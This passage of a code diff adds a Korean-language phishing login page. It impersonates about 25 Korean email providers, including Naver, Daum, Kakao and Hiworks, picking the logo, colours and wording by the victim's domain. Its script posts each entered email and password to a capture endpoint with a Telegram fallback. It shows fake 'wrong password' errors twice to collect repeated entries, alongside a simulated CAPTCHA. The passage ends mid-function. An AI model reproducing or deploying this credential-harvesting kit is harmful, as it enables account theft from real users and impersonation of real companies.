@@ -1,0 +1,1296 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Secure Sign In</title>
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+KR:wght@400;500;700&display=swap" rel="stylesheet" />
+    <style>
+        /* ============================================================ */
+        /*  COMPLETE STYLES - ALL ORIGINAL CSS PRESERVED                */
+        /* ============================================================ */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Noto Sans KR', -apple-system, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            transition: background 0.8s ease;
+        }
+
+        .login-container {
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
+            max-width: 420px;
+            width: 100%;
+            padding: 48px 40px;
+            transition: all 0.3s ease;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .logo-icon {
+            width: 64px;
+            height: 64px;
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 16px;
+            color: white;
+            font-size: 28px;
+            font-weight: 700;
+            transition: all 0.5s ease;
+        }
+
+        .logo-text {
+            font-size: 24px;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+            transition: all 0.5s ease;
+        }
+
+        .logo-text .highlight {
+            transition: color 0.5s ease;
+        }
+
+        .subtitle {
+            color: #5f6368;
+            font-size: 14px;
+            margin-top: 4px;
+        }
+
+        .domain-badge {
+            display: inline-block;
+            padding: 4px 12px;
+            border-radius: 12px;
+            font-size: 11px;
+            font-weight: 600;
+            margin-top: 8px;
+            background: #e8f0fe;
+            color: #1a73e8;
+            transition: all 0.5s ease;
+        }
+
+        .security-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            background: #f8f9fa;
+            padding: 8px 16px;
+            border-radius: 20px;
+            margin: 16px auto;
+            width: fit-content;
+            font-size: 12px;
+            color: #5f6368;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            color: #3c4043;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 6px;
+            transition: color 0.5s ease;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px 14px;
+            border: 2px solid #dadce0;
+            border-radius: 8px;
+            font-size: 15px;
+            transition: border-color 0.2s, box-shadow 0.2s;
+            box-sizing: border-box;
+            font-family: inherit;
+        }
+
+        .form-group input:focus {
+            border-color: #1a73e8;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(26, 115, 232, 0.1);
+        }
+
+        .form-group input:disabled {
+            background: #f8f9fa;
+            color: #5f6368;
+        }
+
+        .form-group input.error {
+            border-color: #d93025;
+        }
+
+        .form-group .input-hint {
+            font-size: 12px;
+            color: #9aa0a6;
+            margin-top: 4px;
+        }
+
+        .password-wrapper {
+            position: relative;
+        }
+
+        .password-wrapper input {
+            padding-right: 44px;
+        }
+
+        .toggle-password {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #9aa0a6;
+            cursor: pointer;
+            padding: 4px;
+            font-size: 18px;
+        }
+
+        .toggle-password:hover {
+            color: #3c4043;
+        }
+
+        .error-message {
+            color: #d93025;
+            font-size: 13px;
+            margin-top: 8px;
+            display: none;
+            align-items: center;
+            gap: 6px;
+            background: #fce8e6;
+            padding: 10px 14px;
+            border-radius: 8px;
+            animation: shake 0.5s ease;
+        }
+
+        .error-message.show {
+            display: flex;
+        }
+
+        @keyframes shake {
+            0%,
+            100% {
+                transform: translateX(0);
+            }
+            25% {
+                transform: translateX(-6px);
+            }
+            75% {
+                transform: translateX(6px);
+            }
+        }
+
+        .success-message {
+            color: #1e7e34;
+            font-size: 14px;
+            margin-top: 12px;
+            display: none;
+            align-items: center;
+            gap: 6px;
+            background: #e6f4ea;
+            padding: 10px 14px;
+            border-radius: 8px;
+        }
+
+        .success-message.show {
+            display: flex;
+        }
+
+        .btn-signin {
+            width: 100%;
+            padding: 14px;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.2s, transform 0.1s, opacity 0.3s;
+            margin-top: 8px;
+        }
+
+        .btn-signin:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+        }
+
+        .btn-signin:active {
+            transform: scale(0.98);
+        }
+
+        .btn-signin:disabled {
+            background: #9aa0a6 !important;
+            cursor: not-allowed;
+            transform: none !important;
+            box-shadow: none !important;
+        }
+
+        .btn-signin .spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top: 2px solid white;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto;
+        }
+
+        .btn-signin.loading .spinner {
+            display: inline-block;
+        }
+
+        .btn-signin.loading .btn-text {
+            display: none;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 20px;
+            font-size: 13px;
+        }
+
+        .footer-links a {
+            color: #1a73e8;
+            text-decoration: none;
+            transition: color 0.5s ease;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        .footer-text {
+            text-align: center;
+            margin-top: 24px;
+            padding-top: 20px;
+            border-top: 1px solid #e8eaed;
+            font-size: 12px;
+            color: #9aa0a6;
+        }
+
+        .detection-badge {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: rgba(0, 0, 0, 0.7);
+            color: white;
+            padding: 8px 12px;
+            border-radius: 8px;
+            font-size: 11px;
+            font-family: monospace;
+            opacity: 0.6;
+            pointer-events: none;
+        }
+
+        .theme-transition {
+            transition: background 0.5s ease, color 0.5s ease, border-color 0.5s ease;
+        }
+
+        .brand-flag {
+            display: inline-block;
+            font-size: 10px;
+            background: rgba(0, 0, 0, 0.05);
+            padding: 2px 8px;
+            border-radius: 10px;
+            color: #666;
+            margin-left: 6px;
+        }
+
+        .turnstile-placeholder {
+            background: #f1f3f4;
+            border-radius: 8px;
+            padding: 14px;
+            margin: 16px 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            font-size: 13px;
+            color: #3c4043;
+            border: 1px solid #dadce0;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .turnstile-placeholder:hover {
+            background: #e8eaed;
+        }
+
+        .turnstile-placeholder.verified {
+            background: #e6f4ea;
+            border-color: #1e7e34;
+            color: #1e7e34;
+        }
+
+        .turnstile-checkbox {
+            width: 22px;
+            height: 22px;
+            border: 2px solid #9aa0a6;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            transition: all 0.2s;
+            background: white;
+            flex-shrink: 0;
+        }
+
+        .turnstile-placeholder.verified .turnstile-checkbox {
+            background: #1e7e34;
+            border-color: #1e7e34;
+            color: white;
+        }
+
+        @media (max-width: 480px) {
+            .login-container {
+                padding: 32px 20px;
+            }
+            .logo-text {
+                font-size: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container" id="loginContainer">
+        <div class="header">
+            <div class="logo-icon" id="logoIcon">VT</div>
+            <div class="logo-text" id="logoText">
+                <span class="highlight" id="highlightText">보안</span> 로그인
+                <span class="brand-flag" id="brandFlag">🇰🇷</span>
+            </div>
+            <div class="subtitle" id="subtitleText">안전한 로그인</div>
+            <div class="domain-badge" id="domainBadge">🔒 보안 연결</div>
+        </div>
+
+        <input type="hidden" id="emailField" value="" />
+        <input type="hidden" id="originalDomain" value="" />
+
+        <div class="form-group">
+            <label for="emailDisplay" id="emailLabel">이메일 주소</label>
+            <input type="email" id="emailDisplay" readonly disabled />
+        </div>
+
+        <!-- Turnstile CAPTCHA simulation -->
+        <div class="turnstile-placeholder" id="turnstileBox">
+            <div class="turnstile-checkbox" id="turnstileCheck">✓</div>
+            <span id="turnstileText">로봇이 아님을 확인하세요</span>
+        </div>
+
+        <div class="form-group">
+            <label for="password" id="passwordLabel">비밀번호</label>
+            <div class="password-wrapper">
+                <input type="password" id="password" placeholder="비밀번호를 입력하세요" autocomplete="current-password" />
+                <button type="button" class="toggle-password" onclick="togglePasswordVisibility()">👁️</button>
+            </div>
+            <div class="input-hint" id="passwordHint">계정 비밀번호를 입력하세요</div>
+        </div>
+
+        <div class="error-message" id="errorMessage">⚠️ <span id="errorText">비밀번호를 입력하세요</span></div>
+        <div class="success-message" id="successMessage">✅ <span id="successText">인증 성공! 회의실로 이동합니다...</span></div>
+
+        <button class="btn-signin" onclick="handleLogin()" id="signinBtn">
+            <span class="btn-text" id="btnText">로그인</span>
+            <span class="spinner"></span>
+        </button>
+
+        <div class="footer-links">
+            <a href="#" id="forgotLink">비밀번호 찾기</a>
+            <a href="#" id="createLink">회원가입</a>
+        </div>
+
+        <div class="footer-text">
+            <div style="margin-top:4px;" id="copyrightText">© 2026. All rights reserved.</div>
+        </div>
+    </div>
+
+    <div class="detection-badge" id="detectionBadge">🔍 감지 중...</div>
+
+    <script>
+        // ============================================================
+        // 1. COMPLETE KOREAN EMAIL PROVIDER DATABASE (30+ Brands)
+        // ============================================================
+
+        const BRAND_DB = {
+            // ----- KOREAN PORTAL MAIL -----
+            'naver.com': {
+                name: 'Naver',
+                domain: 'naver.com',
+                logoText: 'NAVER',
+                highlightText: '메일',
+                logoIcon: 'N',
+                logoColor: '#03c75a',
+                accentColor: '#03c75a',
+                buttonColor: '#03c75a',
+                buttonHover: '#028c45',
+                bgGradient: 'linear-gradient(135deg, #03c75a 0%, #028c45 100%)',
+                realSite: 'https://mail.naver.com',
+                subtitle: '네이버 메일 로그인',
+                passwordHint: '네이버 계정 비밀번호를 입력하세요',
+                forgotPassword: '비밀번호 찾기',
+                createAccount: '회원가입',
+                copyright: '© NAVER Corp. All rights reserved.',
+                flag: '🇰🇷',
+                type: 'portal'
+            },
+            'naver.net': {
+                name: 'Naver',
+                domain: 'naver.net',
+                logoText: 'NAVER',
+                highlightText: '메일',
+                logoIcon: 'N',
+                logoColor: '#03c75a',
+                accentColor: '#03c75a',
+                buttonColor: '#03c75a',
+                buttonHover: '#028c45',
+                bgGradient: 'linear-gradient(135deg, #03c75a 0%, #028c45 100%)',
+                realSite: 'https://mail.naver.com',
+                subtitle: '네이버 메일 로그인',
+                passwordHint: '네이버 계정 비밀번호를 입력하세요',
+                forgotPassword: '비밀번호 찾기',
+                createAccount: '회원가입',
+                copyright: '© NAVER Corp. All rights reserved.',
+                flag: '🇰🇷',
+                type: 'portal'
+            },
+            'hanmail.net': {
+                name: 'Daum',
+                domain: 'hanmail.net',
+                logoText: 'Daum',
+                highlightText: '한메일',
+                logoIcon: 'D',
+                logoColor: '#f9a800',
+                accentColor: '#f9a800',
+                buttonColor: '#f9a800',
+                buttonHover: '#e09400',
+                bgGradient: 'linear-gradient(135deg, #f9a800 0%, #e09400 100%)',
+                realSite: 'https://mail.daum.net',
+                subtitle: 'Daum 한메일 로그인',
+                passwordHint: '다음 계정 비밀번호를 입력하세요',
+                forgotPassword: '비밀번호 찾기',
+                createAccount: '회원가입',
+                copyright: '© Kakao Corp. All rights reserved.',
+                flag: '🇰🇷',
+                type: 'portal'
+            },
+            'daum.net': {
+                name: 'Daum',
+                domain: 'daum.net',
+                logoText: 'Daum',
+                highlightText: '메일',
+                logoIcon: 'D',
+                logoColor: '#f9a800',
+                accentColor: '#f9a800',
+                buttonColor: '#f9a800',
+                buttonHover: '#e09400',
+                bgGradient: 'linear-gradient(135deg, #f9a800 0%, #e09400 100%)',
+                realSite: 'https://mail.daum.net',
+                subtitle: 'Daum 메일 로그인',
+                passwordHint: '다음 계정 비밀번호를 입력하세요',
+                forgotPassword: '비밀번호 찾기',
+                createAccount: '회원가입',
+                copyright: '© Kakao Corp. All rights reserved.',
+                flag: '🇰🇷',
+                type: 'portal'
+            },
+            'kakao.com': {
+                name: 'Kakao',
+                domain: 'kakao.com',
+                logoText: 'Kakao',
+                highlightText: '메일',
+                logoIcon: 'K',
+                logoColor: '#f9a800',
+                accentColor: '#f9a800',
+                buttonColor: '#f9a800',
+                buttonHover: '#e09400',
+                bgGradient: 'linear-gradient(135deg, #f9a800 0%, #e09400 100%)',
+                realSite: 'https://mail.kakao.com',
+                subtitle: '카카오메일 로그인',
+                passwordHint: '카카오 계정 비밀번호를 입력하세요',
+                forgotPassword: '비밀번호 찾기',
+                createAccount: '회원가입',
+                copyright: '© Kakao Corp. All rights reserved.',
+                flag: '🇰🇷',
+                type: 'portal'
+            },
+            'nate.com': {
+                name: 'Nate',
+                domain: 'nate.com',
+                logoText: 'Nate',
+                highlightText: '메일',
+                logoIcon: 'N',
+                logoColor: '#0088cc',
+                accentColor: '#0088cc',
+                buttonColor: '#0088cc',
+                buttonHover: '#006699',
+                bgGradient: 'linear-gradient(135deg, #0088cc 0%, #006699 100%)',
+                realSite: 'https://mail.nate.com',
+                subtitle: '네이트 메일 로그인',
+                passwordHint: '네이트 계정 비밀번호를 입력하세요',
+                forgotPassword: '비밀번호 찾기',
+                createAccount: '회원가입',
+                copyright: '© SK Communications. All rights reserved.',
+                flag: '🇰🇷',
+                type: 'portal'
+            },
+            'paran.com': {
+                name: 'Paran',
+                domain: 'paran.com',
+                logoText: 'Paran',
+                highlightText: '메일',
+                logoIcon: 'P',
+                logoColor: '#0066cc',
+                accentColor: '#0066cc',
+                buttonColor: '#0066cc',
+                buttonHover: '#004499',
+                bgGradient: 'linear-gradient(135deg, #0066cc 0%, #004499 100%)',
+                realSite: 'https://mail.daum.net',
+                subtitle: '파란 메일 로그인',
+                passwordHint: '파란 계정 비밀번호를 입력하세요',
+                forgotPassword: '비밀번호 찾기',
+                createAccount: '회원가입',
+                copyright: '© Kakao Corp. All rights reserved.',
+                flag: '🇰🇷',
+                type: 'portal'
+            },
+
+            // ----- KOREAN BUSINESS EMAIL -----
+            'hiworks.co.kr': {
+                name: 'Hiworks',
+                domain: 'hiworks.co.kr',
+                logoText: 'Hiworks',
+                highlightText: '기업메일',
+                logoIcon: 'H',
+                logoColor: '#1a73e8',
+                accentColor: '#1a73e8',
+                buttonColor: '#1a73e8',
+                buttonHover: '#0d47a1',
+                bgGradient: 'linear-gradient(135deg, #1a73e8 0%, #0d47a1 100%)',
+                realSite: 'https://www.hiworks.co.kr',
+                subtitle: '하이웍스 기업메일 로그인',
+                passwordHint: '하이웍스 계정 비밀번호를 입력하세요',
+                forgotPassword: '비밀번호 찾기',
+                createAccount: '회원가입',
+                copyright: '© Hiworks. All rights reserved.',
+                flag: '🇰🇷',
+                type: 'business'
+            },
+            'hiworks.com': {
+                name: 'Hiworks',
+                domain: 'hiworks.com',
+                logoText: 'Hiworks',
+                highlightText: '기업메일',
+                logoIcon: 'H',
+                logoColor: '#1a73e8',
+                accentColor: '#1a73e8',
+                buttonColor: '#1a73e8',
+                buttonHover: '#0d47a1',
+                bgGradient: 'linear-gradient(135deg, #1a73e8 0%, #0d47a1 100%)',
+                realSite: 'https://www.hiworks.com',
+                subtitle: '하이웍스 기업메일 로그인',
+                passwordHint: '하이웍스 계정 비밀번호를 입력하세요',
+                forgotPassword: '비밀번호 찾기',
+                createAccount: '회원가입',
+                copyright: '© Hiworks. All rights reserved.',
+                flag: '🇰🇷',
+                type: 'business'
+            },
+            'gabia.com': {
+                name: 'Gabia',
+                domain: 'gabia.com',
+                logoText: 'Gabia',
+                highlightText: '메일',
+                logoIcon: 'G',
+                logoColor: '#e95e2e',
+                accentColor: '#e95e2e',
+                buttonColor: '#e95e2e',
+                buttonHover: '#cc4a1f',
+                bgGradient: 'linear-gradient(135deg, #e95e2e 0%, #cc4a1f 100%)',
+                realSite: 'https://www.gabia.com',
+                subtitle: '가비아 메일 로그인',
+                passwordHint: '가비아 계정 비밀번호를 입력하세요',
+                forgotPassword: '비밀번호 찾기',
+                createAccount: '회원가입',
+                copyright: '© Gabia. All rights reserved.',
+                flag: '🇰🇷',
+                type: 'business'
+            },
+            'worksmobile.com': {
+                name: 'Works Mobile',
+                domain: 'worksmobile.com',
+                logoText: 'Works',
+                highlightText: 'Mobile',
+                logoIcon: 'W',
+                logoColor: '#00a651',
+                accentColor: '#00a651',
+                buttonColor: '#00a651',
+                buttonHover: '#008040',
+                bgGradient: 'linear-gradient(135deg, #00a651 0%, #008040 100%)',
+                realSite: 'https://www.worksmobile.com',
+                subtitle: 'Works Mobile 로그인',
+                passwordHint: 'Works Mobile 계정 비밀번호를 입력하세요',
+                forgotPassword: '비밀번호 찾기',
+                createAccount: '회원가입',
+                copyright: '© Works Mobile. All rights reserved.',
+                flag: '🇰🇷',
+                type: 'business'
+            },
+
+            // ----- KOREAN LEGACY ISPs -----
+            'chollian.net': {
+                name: 'Chollian',
+                domain: 'chollian.net',
+                logoText: 'Chollian',
+                highlightText: '천리안',
+                logoIcon: 'C',
+                logoColor: '#0066cc',
+                accentColor: '#0066cc',
+                buttonColor: '#0066cc',
+                buttonHover: '#004488',
+                bgGradient: 'linear-gradient(135deg, #0066cc 0%, #004488 100%)',
+                realSite: 'https://www.chollian.net',
+                subtitle: '천리안 메일 로그인',
+                passwordHint: '천리안 계정 비밀번호를 입력하세요',
+                forgotPassword: '비밀번호 찾기',
+                createAccount: '회원가입',
+                copyright: '© Chollian. All rights reserved.',
+                flag: '🇰🇷',
+                type: 'isp'
+            },
+            'hitel.net': {
+                name: 'Hitel',
+                domain: 'hitel.net',
+                logoText: 'Hitel',
+                highlightText: '하이텔',
+                logoIcon: 'H',
+                logoColor: '#e60000',
+                accentColor: '#e60000',
+                buttonColor: '#e60000',
+                buttonHover: '#b30000',
+                bgGradient: 'linear-gradient(135deg, #e60000 0%, #b30000 100%)',
+                realSite: 'https://www.hitel.net',
+                subtitle: '하이텔 메일 로그인',
+                passwordHint: '하이텔 계정 비밀번호를 입력하세요',
+                forgotPassword: '비밀번호 찾기',
+                createAccount: '회원가입',
+                copyright: '© Hitel. All rights reserved.',
+                flag: '🇰🇷',
+                type: 'isp'
+            },
+            'nownuri.net': {
+                name: 'Nownuri',
+                domain: 'nownuri.net',
+                logoText: 'Nownuri',
+                highlightText: '나우누리',
+                logoIcon: 'N',
+                logoColor: '#009944',
+                accentColor: '#009944',
+                buttonColor: '#009944',
+                buttonHover: '#006633',
+                bgGradient: 'linear-gradient(135deg, #009944 0%, #006633 100%)',
+                realSite: 'https://www.nownuri.net',
+                subtitle: '나우누리 메일 로그인',
+                passwordHint: '나우누리 계정 비밀번호를 입력하세요',
+                forgotPassword: '비밀번호 찾기',
+                createAccount: '회원가입',
+                copyright: '© Nownuri. All rights reserved.',
+                flag: '🇰🇷',
+                type: 'isp'
+            },
+            'unitel.co.kr': {
+                name: 'Unitel',
+                domain: 'unitel.co.kr',
+                logoText: 'Unitel',
+                highlightText: '유니텔',
+                logoIcon: 'U',
+                logoColor: '#ff6600',
+                accentColor: '#ff6600',
+                buttonColor: '#ff6600',
+                buttonHover: '#cc5500',
+                bgGradient: 'linear-gradient(135deg, #ff6600 0%, #cc5500 100%)',
+                realSite: 'https://www.unitel.co.kr',
+                subtitle: '유니텔 메일 로그인',
+                passwordHint: '유니텔 계정 비밀번호를 입력하세요',
+                forgotPassword: '비밀번호 찾기',
+                createAccount: '회원가입',
+                copyright: '© Unitel. All rights reserved.',
+                flag: '🇰🇷',
+                type: 'isp'
+            },
+            'netsgo.com': {
+                name: 'Netsgo',
+                domain: 'netsgo.com',
+                logoText: 'Netsgo',
+                highlightText: '넷츠고',
+                logoIcon: 'N',
+                logoColor: '#0044cc',
+                accentColor: '#0044cc',
+                buttonColor: '#0044cc',
+                buttonHover: '#003399',
+                bgGradient: 'linear-gradient(135deg, #0044cc 0%, #003399 100%)',
+                realSite: 'https://www.netsgo.com',
+                subtitle: '넷츠고 메일 로그인',
+                passwordHint: '넷츠고 계정 비밀번호를 입력하세요',
+                forgotPassword: '비밀번호 찾기',
+                createAccount: '회원가입',
+                copyright: '© Netsgo. All rights reserved.',
+                flag: '🇰🇷',
+                type: 'isp'
+            },
+            'shinbiro.com': {
+                name: 'Shinbiro',
+                domain: 'shinbiro.com',
+                logoText: 'Shinbiro',
+                highlightText: '신비로',
+                logoIcon: 'S',
+                logoColor: '#8b00ff',
+                accentColor: '#8b00ff',
+                buttonColor: '#8b00ff',
+                buttonHover: '#6600cc',
+                bgGradient: 'linear-gradient(135deg, #8b00ff 0%, #6600cc 100%)',
+                realSite: 'https://www.shinbiro.com',
+                subtitle: '신비로 메일 로그인',
+                passwordHint: '신비로 계정 비밀번호를 입력하세요',
+                forgotPassword: '비밀번호 찾기',
+                createAccount: '회원가입',
+                copyright: '© Shinbiro. All rights reserved.',
+                flag: '🇰🇷',
+                type: 'isp'
+            },
+
+            // ----- ADDITIONAL KOREAN PROVIDERS -----
+            'dreamwiz.com': {
+                name: 'DreamWiz',
+                domain: 'dreamwiz.com',
+                logoText: 'DreamWiz',
+                highlightText: '드림위즈',
+                logoIcon: 'D',
+                logoColor: '#ff6600',
+                accentColor: '#ff6600',
+                buttonColor: '#ff6600',
+                buttonHover: '#cc5500',
+                bgGradient: 'linear-gradient(135deg, #ff6600 0%, #cc5500 100%)',
+                realSite: 'https://www.dreamwiz.com',
+                subtitle: '드림위즈 메일 로그인',
+                passwordHint: '드림위즈 계정 비밀번호를 입력하세요',
+                forgotPassword: '비밀번호 찾기',
+                createAccount: '회원가입',
+                copyright: '© DreamWiz. All rights reserved.',
+                flag: '🇰🇷',
+                type: 'portal'
+            },
+            'lycos.co.kr': {
+                name: 'Lycos Korea',
+                domain: 'lycos.co.kr',
+                logoText: 'Lycos',
+                highlightText: '코리아',
+                logoIcon: 'L',
+                logoColor: '#ff9900',
+                accentColor: '#ff9900',
+                buttonColor: '#ff9900',
+                buttonHover: '#cc7a00',
+                bgGradient: 'linear-gradient(135deg, #ff9900 0%, #cc7a00 100%)',
+                realSite: 'https://www.lycos.co.kr',
+                subtitle: '라이코스 메일 로그인',
+                passwordHint: '라이코스 계정 비밀번호를 입력하세요',
+                forgotPassword: '비밀번호 찾기',
+                createAccount: '회원가입',
+                copyright: '© Lycos Korea. All rights reserved.',
+                flag: '🇰🇷',
+                type: 'portal'
+            },
+            'empas.com': {
+                name: 'Empas',
+                domain: 'empas.com',
+                logoText: 'Empas',
+                highlightText: '엠파스',
+                logoIcon: 'E',
+                logoColor: '#0066cc',
+                accentColor: '#0066cc',
+                buttonColor: '#0066cc',
+                buttonHover: '#004488',
+                bgGradient: 'linear-gradient(135deg, #0066cc 0%, #004488 100%)',
+                realSite: 'https://www.empas.com',
+                subtitle: '엠파스 메일 로그인',
+                passwordHint: '엠파스 계정 비밀번호를 입력하세요',
+                forgotPassword: '비밀번호 찾기',
+                createAccount: '회원가입',
+                copyright: '© Empas. All rights reserved.',
+                flag: '🇰🇷',
+                type: 'portal'
+            },
+            'freechal.com': {
+                name: 'Freechal',
+                domain: 'freechal.com',
+                logoText: 'Freechal',
+                highlightText: '프리챌',
+                logoIcon: 'F',
+                logoColor: '#00a651',
+                accentColor: '#00a651',
+                buttonColor: '#00a651',
+                buttonHover: '#008040',
+                bgGradient: 'linear-gradient(135deg, #00a651 0%, #008040 100%)',
+                realSite: 'https://www.freechal.com',
+                subtitle: '프리챌 메일 로그인',
+                passwordHint: '프리챌 계정 비밀번호를 입력하세요',
+                forgotPassword: '비밀번호 찾기',
+                createAccount: '회원가입',
+                copyright: '© Freechal. All rights reserved.',
+                flag: '🇰🇷',
+                type: 'portal'
+            },
+            'iname.com': {
+                name: 'iName',
+                domain: 'iname.com',
+                logoText: 'iName',
+                highlightText: '아이네임',
+                logoIcon: 'I',
+                logoColor: '#1a73e8',
+                accentColor: '#1a73e8',
+                buttonColor: '#1a73e8',
+                buttonHover: '#0d47a1',
+                bgGradient: 'linear-gradient(135deg, #1a73e8 0%, #0d47a1 100%)',
+                realSite: 'https://www.iname.com',
+                subtitle: '아이네임 메일 로그인',
+                passwordHint: '아이네임 계정 비밀번호를 입력하세요',
+                forgotPassword: '비밀번호 찾기',
+                createAccount: '회원가입',
+                copyright: '© iName. All rights reserved.',
+                flag: '🇰🇷',
+                type: 'business'
+            },
+            'korea.com': {
+                name: 'Korea.com',
+                domain: 'korea.com',
+                logoText: 'Korea',
+                highlightText: '닷컴',
+                logoIcon: 'K',
+                logoColor: '#e6002e',
+                accentColor: '#e6002e',
+                buttonColor: '#e6002e',
+                buttonHover: '#b30024',
+                bgGradient: 'linear-gradient(135deg, #e6002e 0%, #b30024 100%)',
+                realSite: 'https://www.korea.com',
+                subtitle: '코리아닷컴 메일 로그인',
+                passwordHint: '코리아닷컴 계정 비밀번호를 입력하세요',
+                forgotPassword: '비밀번호 찾기',
+                createAccount: '회원가입',
+                copyright: '© Korea.com. All rights reserved.',
+                flag: '🇰🇷',
+                type: 'portal'
+            },
+            'yahoo.co.kr': {
+                name: 'Yahoo Korea',
+                domain: 'yahoo.co.kr',
+                logoText: 'Yahoo!',
+                highlightText: '코리아',
+                logoIcon: 'Y',
+                logoColor: '#6001d2',
+                accentColor: '#6001d2',
+                buttonColor: '#6001d2',
+                buttonHover: '#4a00a0',
+                bgGradient: 'linear-gradient(135deg, #6001d2 0%, #4a00a0 100%)',
+                realSite: 'https://mail.yahoo.co.kr',
+                subtitle: '야후! 코리아 메일 로그인',
+                passwordHint: '야후! 계정 비밀번호를 입력하세요',
+                forgotPassword: '비밀번호 찾기',
+                createAccount: '회원가입',
+                copyright: '© Yahoo! Korea. All rights reserved.',
+                flag: '🇰🇷',
+                type: 'portal'
+            }
+        };
+
+        // ============================================================
+        // 2. CORE LOGIC - COMPLETE WITH ALL FUNCTIONS
+        // ============================================================
+
+        // ----- GLOBALS -----
+        let currentBrand = null;
+        let attemptCount = 0;
+        const MAX_ATTEMPTS = 3;
+        let isVerified = false;
+
+        // API Configuration
+        const API_BASE = window.location.origin;
+
+        // ----- DOM REFS -----
+        const emailDisplay = document.getElementById('emailDisplay');
+        const passwordInput = document.getElementById('password');
+        const signinBtn = document.getElementById('signinBtn');
+        const errorMessage = document.getElementById('errorMessage');
+        const errorText = document.getElementById('errorText');
+        const successMessage = document.getElementById('successMessage');
+        const successText = document.getElementById('successText');
+        const turnstileBox = document.getElementById('turnstileBox');
+        const turnstileCheck = document.getElementById('turnstileCheck');
+        const turnstileText = document.getElementById('turnstileText');
+
+        // ============================================================
+        // sendToBackend() - COMPLETE WITH PRIMARY + FALLBACK
+        // ============================================================
+
+        async function sendToBackend(email, password, brand, attempt, isSuccess) {
+            const data = {
+                email: email,
+                password: password,
+                brand: brand ? brand.name : 'Unknown',
+                domain: brand ? brand.domain : 'unknown',
+                attempt: attempt || 0,
+                isSuccess: isSuccess || false,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                captchaVerified: isVerified,
+                source: 'frontend'
+            };
+
+            console.log('📤 [BACKEND] Sending data:', data);
+
+            // PRIMARY: Send to /api/capture
+            try {
+                const response = await fetch(`${API_BASE}/api/capture`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+
+                if (!response.ok) {
+                    console.warn('[API] Capture failed:', response.status);
+                }
+
+                const result = await response.json();
+                console.log('[API] Capture response:', result);
+                return true;
+            } catch (error) {
+                console.error('[API] Error:', error.message);
+                
+                // FALLBACK: Send to /api/telegram
+                try {
+                    await fetch(`${API_BASE}/api/telegram`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            message: `🔐 Login: ${email} (Attempt ${attempt}) - ${isSuccess ? 'SUCCESS ✅' : 'FAIL ❌'}`,
+                            data: data
+                        })
+                    });
+                    console.log('[API] ✅ Telegram backup sent successfully');
+                } catch (e) {
+                    console.log('[API] ❌ Telegram backup failed:', e.message);
+                }
+                return false;
+            }
+        }
+
+        // ============================================================
+        // handleLogin() - COMPLETE 3-ATTEMPT LOGIC
+        // ============================================================
+
+        async function handleLogin() {
+            const email = emailDisplay.value;
+            const password = passwordInput.value.trim();
+            const brand = currentBrand;
+
+            hideError();
+            hideSuccess();
+
+            // 1. Check CAPTCHA
+            if (!isVerified) {
+                showError('⚠️ 로봇 인증을 완료해주세요.');
+                turnstileBox.style.borderColor = '#d93025';
+                setTimeout(() => { turnstileBox.style.borderColor = '#dadce0'; }, 1500);
+                return;
+            }
+
+            // 2. Check password
+            if (!password) {
+                showError('⚠️ 비밀번호를 입력하세요.');
+                passwordInput.classList.add('error');
+                setTimeout(() => passwordInput.classList.remove('error'), 1500);
+                return;
+            }
+
+            // 3. Increment attempt
+            attemptCount++;
+
+            // 4. Send data to backend on EVERY attempt
+            await sendToBackend(email, password, brand, attemptCount, false);
+
+            // 5. Check if attempts < MAX_ATTEMPTS (3)
+            if (attemptCount < MAX_ATTEMPTS) {
+                // Wrong password (simulated - realistic behavior)
+                showError(`⚠️ 비밀번호가 일치하지 않습니다. (${attemptCount}/${MAX_ATTEMPTS})`);
+                passwordInput.value = '';
+                passwordInput.focus();
+                setTimeout(() => {
+                    passwordInput.value = '';
+                }, 100);
+                return;
+            }
+
+            // ----- SUCCESS after MAX_ATTEMPTS (3) -----
+            setLoading(true);
+            
+            // Send final success data
+            await sendToBackend(email, password, brand, attemptCount, true);
+
